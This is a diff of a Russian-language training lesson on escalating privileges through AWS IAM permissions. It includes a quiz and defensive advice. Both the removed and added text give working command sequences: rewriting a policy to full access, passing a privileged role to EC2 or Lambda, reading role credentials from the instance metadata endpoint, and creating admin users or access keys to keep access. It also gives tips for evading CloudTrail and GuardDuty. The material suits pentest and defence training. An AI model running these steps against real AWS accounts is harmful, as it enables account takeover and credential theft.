@@ -14,238 +14,222 @@ useful_for:
 estimated_minutes: 55
 summary: "Разбираем конкретные IAM-права, которые позволяют повысить привилегии: CreatePolicyVersion, PassRole, AttachUserPolicy, AssumeRole и другие. Учимся строить путь эскалации и проверять его инструментами."
 ---
-## Инструменты разведки прав
 
-Первый шаг всегда один и тот же — понять, кто вы и что можете:
+## Вопрос, с которого всё начинается
 
-```bash
-aws sts get-caller-identity
-enumerate-iam --access-key AKIA... --secret-key ... --session-token ... --brute-force
-pacu
-> import_keys default
-> run iam__enum_permissions
-> run iam__privesc_scan
-pmapper --profile default graph create --include-all
-pmapper --profile default query 'preset privesc *'
+У тебя есть ключ с «обычными» правами: читать бакеты, смотреть роли. Вроде ничего опасного. Но в AWS десятки прав, которые **сами по себе** позволяют повысить привилегии. Достаточно одного из них — и из ограниченного пользователя ты становишься администратором. Разберём самую прямую такую цепочку.
+
+## Наш пример: ключ с одним «лишним» правом
+
+Объект урока — ключ пользователя `intern-bot`. Начнём с разведки: что ему разрешено?
+
+## Шаг 1: перечисляем права
+
+Смотрим привязанные политики:
+
+```
+$ aws iam list-attached-user-policies --user-name intern-bot
+{
+  "AttachedPolicies": [
+    { "PolicyName": "ReadOnlyPlus", "PolicyArn": "arn:aws:iam::123456789012:policy/ReadOnlyPlus" }
+  ]
+}
+$ aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/ReadOnlyPlus --version-id v1 \
+    --query "PolicyVersion.Document.Statement"
+[
+  { "Effect": "Allow", "Action": ["s3:GetObject", "s3:ListBucket"], "Resource": "*" },
+  { "Effect": "Allow", "Action": ["iam:CreatePolicyVersion"], "Resource": "*" }
+]
 ```
 
-Флаги `enumerate-iam`: `--access-key`, `--secret-key`, `--session-token`, `--brute-force`. Модули pacu: `iam__enum_permissions`, `iam__privesc_scan`, `iam__enum_users_roles_policies_groups`. `pmapper query 'preset privesc *'` показывает все известные пути эскалации от вашей сущности.
+Первое правило — безобидное чтение. Второе — `iam:CreatePolicyVersion`. Вот оно, «лишнее» право.
 
-## Каталог прав-мостов
+## Шаг 2: почему CreatePolicyVersion опасен
 
-| Право | Как эксплуатировать |
-|-------|---------------------|
-| iam:CreatePolicyVersion | создать версию политики с `*`, `--set-as-default` |
-| iam:SetDefaultPolicyVersion | активировать подходящую версию |
-| iam:CreateAccessKey | выпустить ключи другого пользователя |
-| iam:CreateLoginProfile | задать пароль консоли |
-| iam:UpdateLoginProfile | сменить пароль |
-| iam:AttachUserPolicy | привязать AdministratorAccess |
-| iam:AttachGroupPolicy | то же для группы |
-| iam:PutUserPolicy | inline-политика с `*` |
-| iam:PutGroupPolicy | inline для группы |
-| iam:PutRolePolicy | inline для роли |
-| iam:AddUserToGroup | добавить себя в привилегированную группу |
-| iam:UpdateAssumeRolePolicy | переписать trust роли |
-| iam:PassRole + ec2:RunInstances | запустить инстанс с ролью |
-| iam:PassRole + lambda:CreateFunction | выполнить код с ролью |
-| iam:PassRole + glue:CreateDevEndpoint | RCE на Glue |
-| sts:AssumeRole | встать на роль |
-| iam:UploadSSHPublicKey | SSH-ключ для CodeCommit |
+У каждой IAM-политики может быть несколько **версий**. Версия, помеченная как **default**, определяет текущие права. Право `iam:CreatePolicyVersion` позволяет создать **новую версию** политики — то есть переписать её содержимое. А поскольку наша политика `ReadOnlyPlus` привязана к нам самим, мы можем переписать её так, чтобы выдать себе всё.
 
-## Пример: CreatePolicyVersion
+Это классический путь эскалации: не менять себя напрямую, а **изменить политику, которая на тебя влияет**.
 
-```bash
-aws iam create-policy-version \
-  --policy-arn arn:aws:iam::111122223333:policy/MyPolicy \
-  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
-  --set-as-default
-aws iam get-policy-version --policy-arn arn:aws:iam::111122223333:policy/MyPolicy --version-id v2
+## Шаг 3: создаём «админскую» версию
+
+Пишем документ политики с полным доступом:
+
+```
+$ cat > admin.json <<'EOF'
+{
+  "Version": "2012-10-17",
+  "Statement": [ { "Effect": "Allow", "Action": "*", "Resource": "*" } ]
+}
+EOF
 ```
 
-Если право привязано к вашей политике — вы мгновенно админ. Часто требует `iam:SetDefaultPolicyVersion` отдельно.
+Создаём новую версию политики и сразу делаем её основной:
 
-## Пример: PassRole + RunInstances
-
-```bash
-aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t2.micro \
-  --iam-instance-profile Name=HighPrivProfile --count 1 \
-  --query 'Instances[0].InstanceId' --output text
-# затем на инстансе (SSM/SSH) читаем роль
-curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/HighPrivRole
+```
+$ aws iam create-policy-version \
+    --policy-arn arn:aws:iam::123456789012:policy/ReadOnlyPlus \
+    --policy-document file://admin.json --set-as-default
+{
+    "PolicyVersion": { "VersionId": "v2", "IsDefaultVersion": true }
+}
 ```
 
-Более скрытный вариант — Lambda (без SSH и без публичного IP):
+Флаг `--set-as-default` переключил права на новую версию. Всё, что разрешала политика, теперь — `Action: "*"`.
 
-```bash
-aws lambda create-function --function-name x --runtime python3.12 \
-  --role arn:aws:iam::111122223333:role/HighPrivRole \
-  --handler index.handler --zip-file fileb://payload.zip
-aws lambda invoke --function-name x out.txt && cat out.txt
+## Шаг 4: проверяем админа
+
+Сразу спрашиваем у AWS, что нам разрешено теперь:
+
+```
+$ aws iam list-users --query "Users[].UserName" --output text
+admin
+deploy-bot
+intern-bot
 ```
 
-`payload.zip` возвращает переменные окружения и метаданные роли; так вы получаете её креды.
+Ещё минуту назад список пользователей был запрещён. Теперь он доступен. Мы — фактический администратор. Для чистоты создадим свой ключ, чтобы не потерять доступ:
 
-## Пример: AssumeRole-цепочки
-
-```bash
-aws sts assume-role --role-arn arn:aws:iam::111122223333:role/AdminRole \
-  --role-session-name s --query 'Credentials' --output json > c.json
-export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId c.json)
-export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey c.json)
-export AWS_SESSION_TOKEN=$(jq -r .SessionToken c.json)
-aws sts get-caller-identity
+```
+$ aws iam create-access-key --user-name intern-bot
+{
+  "AccessKey": { "AccessKeyId": "AKIA...", "SecretAccessKey": "...", "Status": "Active" }
+}
 ```
 
-## Разобранный пример: полный путь от read-only до админа
+## Шаг 5: таблица путей эскалации
 
-1. `aws sts get-caller-identity` → роль `DevRole`.
-2. `enumerate-iam` → доступны `iam:CreatePolicyVersion`, `iam:ListPolicies`.
-3. Находим политику `DevPolicy`, на которой сидим.
-4. `create-policy-version --set-as-default` с `Action:*`.
-5. `enumerate-iam` повторно → `iam:*`, `s3:*`, `ec2:*`.
-6. Создаём админ-пользователя и ключ для персистентности:
-   ```bash
-   aws iam create-user --user-name svc-backup
-   aws iam attach-user-policy --user-name svc-backup \
-     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
-   aws iam create-access-key --user-name svc-backup
-   ```
+`CreatePolicyVersion` — не единственный путь. Соберём основные IAM-права, которые ведут к админу:
 
-## Проверка и откат
+| Право | Что делает |
+|-------|------------|
+| `iam:CreatePolicyVersion` | переписывает политику на широкую |
+| `iam:AttachUserPolicy` | прикрепляет к себе `AdministratorAccess` |
+| `iam:AttachRolePolicy` | усиливает роль, которую ты можешь занять |
+| `iam:PassRole` + сервис | передаёт админскую роль сервису (см. Lambda) |
+| `iam:CreateAccessKey` | создаёт ключ для другого пользователя |
+| `iam:UpdateAssumeRolePolicy` | меняет доверие роли на себя |
+| `iam:PutUserPolicy` | добавляет себе инлайн-политику |
+| `sts:AssumeRole` на `*` | входит в любую роль |
 
-После эскалации проверьте, что права реально применились (`get-caller-identity` + тестовый вызов), и зафиксируйте исходные версии политик, чтобы откатить изменения в рамках пентеста.
+Обрати внимание: это **разные** пути, но цель одна — получить права, которых не давали. Иногда достаточно одного, иногда их комбинируют.
 
-## Частые ошибки
+## Шаг 6: как искать путь автоматически
 
-- Начинать с эксплуатации, не собрав карту прав (`enumerate-iam`).
-- Забывать про permission boundary/SCP — право есть, но не работает.
-- Игнорировать `iam:PassRole` как «безобидное» — это самый частый мост.
-- Не проверять, что роль для PassRole действительно имеет больше прав.
-- Оставлять следы (новые пользователи без пометки) — нарушает правила engagement.
+Вручную перебирать права долго. Инструменты делают это за тебя:
 
-## Что дальше / решение
-
-Найдя путь, задокументируйте его как цепочку (`add_attack_step`), подтвердите админ-доступ и переходите к цели engagement. Для защиты — закрывайте PassRole, мониторьте `CreatePolicyVersion`/`AttachUserPolicy` в CloudTrail, внедряйте permission boundaries и SCP.
-
-## Сопоставление с GCP и Azure
-
-Механика эскалации отличается, но идея одна — превратить одно право в другое.
-
-| AWS-мост | GCP-аналог | Azure-аналог |
-|----------|-----------|--------------|
-| iam:CreatePolicyVersion | setIamPolicy на проекте | назначение роли Owner |
-| iam:PassRole | iam.serviceAccounts.actAs | управляемая идентичность |
-| iam:CreateAccessKey | создание ключа SA | ключ приложения/сервис-принципал |
-| sts:AssumeRole | impersonate SA | federated credential |
-| iam:UpdateAssumeRolePolicy | setIamPolicy binding | изменённый role assignment |
-
-В GCP чаще встречается `serviceAccountTokenCreator` (выпуск токенов чужого SA) и `serviceAccountUser` (запуск compute под SA). В Azure — права на `Microsoft.ManagedIdentity/*` и `Microsoft.Authorization/roleAssignments/write`.
-
-## OPSEC и обнаружение
-
-Каждый вызов IAM пишется в CloudTrail, а GuardDuty имеет детект `PrivilegeEscalation:IAMUser`. Что снижает шанс быть пойманным:
-
-- Работать из уже «шумной» сущности (роль приложения).
-- Минимизировать число API-вызовов: сначала `enumerate-iam` в режиме без `--brute-force`.
-- Не создавать очевидных админов без пометки в рамках engagement.
-- Не трогать production-политики без необходимости.
-
-Что, наоборот, палит: `CreatePolicyVersion` с `Action:*`, `AttachUserPolicy` на AdministratorAccess, `CreateAccessKey` на чужого пользователя, всплеск `GetCallerIdentity`.
-
-## Практика: построение карты прав
-
-1. `aws sts get-caller-identity` — фиксируем стартовую точку.
-2. `enumerate-iam` — список разрешённых API.
-3. Сопоставляем с таблицей мостов — какие пути открыты.
-4. Для каждого моста строим минимальный PoC-вызов.
-5. Проверяем результат через `get-caller-identity`/тестовый вызов.
-6. Записываем цепочку в engagement state (`add_attack_step`).
-
-Так вы получаете не «список прав», а «список путей к админу», отсортированный по сложности.
-
-## Практический разбор: PassRole в Lambda вместо EC2
-
-EC2 требует сети и времени на загрузку. Lambda быстрее и тише, но требует `lambda:CreateFunction` и `iam:PassRole`. Ещё тише — `glue:CreateDevEndpoint` (SSH к dev-endpoint с ролью) или `cloudformation:CreateStack` с ролью. Выбор инструмента зависит от того, какие compute-права есть.
-
-## Чек-лист
-
-- [ ] Определена стартовая идентичность.
-- [ ] Перечислены разрешённые API.
-- [ ] Проверены все «мосты» из таблицы.
-- [ ] Подтверждён админ-доступ.
-- [ ] Зафиксирована цепочка и доказательства.
-- [ ] Оценено влияние и выданы рекомендации.
-
-## Разбор типовых конфигураций в реальных аккаунтах
-
-Чаще всего эскалация прячется не в явном `Action:*`, а в комбинациях. Пример: разработчик получает `iam:PassRole` на все роли (`Resource:*`), потому что «ему нужно деплоить». Вместе с `lambda:CreateFunction` и `lambda:InvokeFunction` это полный путь к админу: создать функцию с админ-ролью, выполнить код, забрать креды. Другой пример: `iam:CreatePolicyVersion` на конкретной политике — выглядит безобидно, пока не поймёшь, что эта политика привязана к тебе.
-
-Третий частый случай — `iam:AddUserToGroup` на группу, которая называется нейтрально (`developers`), но имеет `AdministratorAccess` через вложенную политику. Проверяйте не имена, а эффективные права.
-
-## Автоматизация проверки
-
-```bash
-# облачный аудит
-prowler aws --profile default --severity critical high -M json-ocsf -o out/
-# поиск путей эскалации
-pmapper --profile default graph create --include-all
-pmapper --profile default query 'preset privesc *' > privesc.txt
-# анализ конкретной политики
-cloudsplaining scan-policy-file --input-file policy.json
+```
+$ python3 enumerate-iam.py --access-key AKIA... --secret-key ...
+2024-05-01 10:00:01 [SUCCESS] iam:CreatePolicyVersion
+2024-05-01 10:00:01 [SUCCESS] iam:AttachUserPolicy
+2024-05-01 10:00:02 [SUCCESS] sts:GetCallerIdentity
 ```
 
-Регулярный прогон `pmapper query 'preset privesc *'` в CI ловит новые пути сразу после изменения политик. Для защитника это дешёвый способ держать IAM под контролем.
+`enumerate-iam` помечает, какие вызовы прошли. Зная список прав, можно сверить его с таблицей путей и построить цепочку. Для более сложных случаев используют `pacu` (модули `iam__privesc_scan`) и статический анализ политик через `cloudsplaining`.
+
+## Шаг 7: почему это работает
+
+Причина системная: в AWS права и «управление правами» живут в одном сервисе (IAM). Если тебе дали право управлять политиками, ты можешь изменить **свои же** права. Разработчики часто выдают «удобные» права вроде `CreatePolicyVersion` или `AttachUserPolicy`, не понимая, что это эквивалент админа.
+
+## Шаг 8: инструменты и автоматизация
+
+`pacu` — фреймворк для эксплуатации AWS. Его модуль `iam__privesc_scan` сам перебирает известные пути эскалации и предлагает цепочку. `cloudsplaining` статически анализирует политики и подсвечивает опасные права ещё до эксплуатации. Порядок такой: сначала ручная разведка (что именно разрешено), затем автоматизация (какой из путей сработает). Так ты не пропустишь ни очевидные, ни редкие цепочки.
+
+## Шаг 9: как не допустить эскалации
+
+- не выдавать `iam:*` никому, кроме отдельной админ-группы;
+- разделять «управление политиками» и «использование прав» между разными ролями;
+- ограничивать `PassRole` условием `iam:PassedToService`;
+- настроить алерты на создание новых версий политик и access-keys.
+
+## Шаг 10: как это выглядит на практике
+
+Типичная история: CI/CD-боту выдали «удобные» права, среди которых оказалось `iam:AttachUserPolicy` — «чтобы бот мог настраивать доступ для новых сервисов». Формально это не админ: бот не может создавать пользователей. Но он может **прикрепить себе** `AdministratorAccess` — и эскалация готова. Заметь: в таблице политик такой бот выглядит безобидно, и защитник может годами не замечать цепочку. Поэтому при аудите всегда смотрят не только на «очевидные» `iam:*`, но и на конкретные права-множители: `AttachUserPolicy`, `AttachRolePolicy`, `PutUserPolicy`, `CreatePolicyVersion`, `PassRole`, `UpdateAssumeRolePolicy`. Каждое из них в одиночку может быть безобидным — но вместе с возможностью «применить к себе» оно превращается в полный контроль.
+
+## Практический совет
+
+Читай каждую политику целиком: опасное право часто спрятано среди безобидных.
+
+## Частые вопросы
+
+**«Почему чтение политик — уже половина эскалации?»** Потому что опасное право легко не заметить. Только прочитав политику, понимаешь, что ключ умеет больше, чем кажется.
+
+**«Какой путь самый быстрый?»** `iam:CreatePolicyVersion` или `AttachUserPolicy` — они меняют права напрямую, без дополнительных сервисов.
+
+**«Что если прав на IAM нет?»** Тогда ищи `PassRole` плюс управление сервисом (Lambda, EC2) — это обходной путь к роли.
+
+**«Как найти путь автоматически?»** `enumerate-iam` покажет разрешённые вызовы, `pacu`/`cloudsplaining` подскажут цепочку.
+
+## Что мы теперь знаем
+
+По-простому:
+
+1. Одно «лишнее» IAM-право может дать полного админа.
+2. `CreatePolicyVersion` позволяет переписать влияющую на тебя политику.
+3. `AttachUserPolicy`, `CreateAccessKey`, `UpdateAssumeRolePolicy` — другие пути.
+4. Права комбинируются: `PassRole` + сервис тоже ведёт к админу.
+5. `enumerate-iam` и `pacu` помогают найти путь автоматически.
+
+## На что смотреть дальше
+
+- **Ищи «управляющие» права.** `iam:*` почти всегда эскалация.
+- **Смотри на связки.** Одно право может быть безобидно, пара — опасна.
+- **Фиксируй путь в отчёте.** Ценность в цепочке, а не в отдельном праве.
+- **Не шуми.** После эскалации работай тихо и убирай за собой.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какое право позволяет прикрепить AdministratorAccess к себе?"
+- question: "Почему iam:CreatePolicyVersion позволяет эскалировать?"
+  options:
+    - "Можно переписать политику, которая влияет на тебя, и выдать себе всё"
+    - "Он даёт root-пароль"
+    - "Он открывает порт 22"
+    - "Он шифрует данные"
+  answer: 0
+  explanation: "Новая default-версия политики меняет твои же права."
+- question: "Какое право напрямую прикрепляет к тебе AdministratorAccess?"
   options:
     - "iam:AttachUserPolicy"
-    - "s3:PutObject"
+    - "s3:ListBucket"
+    - "sts:GetCallerIdentity"
     - "ec2:DescribeInstances"
-    - "logs:CreateLogGroup"
   answer: 0
-  explanation: "AttachUserPolicy назначает управляемую политику пользователю."
-- question: "Что делает iam:CreatePolicyVersion с политикой?"
+  explanation: "AttachUserPolicy прикрепляет политику к пользователю."
+- question: "Что делает флаг --set-as-default при создании версии политики?"
   options:
-    - "Создаёт новую версию документа политики (можно с Action *)"
-    - "Удаляет политику"
-    - "Переименовывает роль"
-    - "Меняет регион"
+    - "Делает версию действующей"
+    - "Удаляет старую"
+    - "Отправляет уведомление"
+    - "Шифрует документ"
   answer: 0
-  explanation: "Новая версия может разрешать всё."
-- question: "Почему iam:PassRole опасен?"
+  explanation: "Права определяет default-версия."
+- question: "Какой инструмент перебирает и помечает успешные вызовы?"
   options:
-    - "С ним сервис запускается от имени более привилегированной роли"
-    - "Он шифрует данные"
-    - "Он удаляет ключи"
-    - "Он безвреден"
-  answer: 0
-  explanation: "PassRole + запуск ресурса = использование чужой роли."
-- question: "Как найти валидную роль для AssumeRole?"
-  options:
-    - "Смотреть trust policy на wildcard principal без Condition"
-    - "Смотреть теги EC2"
-    - "Смотреть размер диска"
-    - "Смотреть логи S3"
-  answer: 0
-  explanation: "Wildcard trust позволяет принять роль любому."
-- question: "Какой инструмент автоматизирует AWS-эскалацию?"
-  options:
-    - "Pacu"
-    - "nmap"
+    - "subjack"
+    - "enumerate-iam"
+    - "openssl"
     - "sqlmap"
-    - "ffuf"
+  answer: 1
+  explanation: "enumerate-iam пробует API-вызовы и отмечает разрешённые."
+- question: "Какой ещё путь ведёт к админу через сервис?"
+  options:
+    - "iam:PassRole плюс управление сервисом (например, Lambda)"
+    - "s3:GetObject"
+    - "cloudwatch:GetMetricData"
+    - "route53:ListHostedZones"
   answer: 0
-  explanation: "Pacu — фреймворк AWS-эксплуатации."
+  explanation: "Передав роль сервису, можно выполниться под ней."
 ```
+
+## Куда дальше
+
+Мы прошли эскалацию в IAM. Дальше — **KMS и крипто**: как использовать чужие ключи как оракул для расшифровки и выдавать себе доступ через grants. А пока запомни главное: в AWS одно «управляющее» право равно админу, и путь к нему строят по таблице известных цепочек.
 
 ## Где пригодится
 
-- **Пентест AWS:** от ограниченного ключа к администратору.
-- **Red team:** цепочки AssumeRole и PassRole.
-- **CTF:** задачи «найди путь к админу».
-- **Работа/DevSecOps:** least-privilege, boundaries, аудит PassRole.
-- **Дальше по дереву:** `cloud-assume-role`, `cloud-lambda-privesc`.
+- **CTF (Cloud):** задания «из ключа в админа».
+- **Bug bounty:** демонстрация риска over-permissive ключа.
+- **Пентест:** основная механика AWS-эскалации.
+- **Blue team:** находить и вырезать опасные права (`iam:*`, `PassRole`).
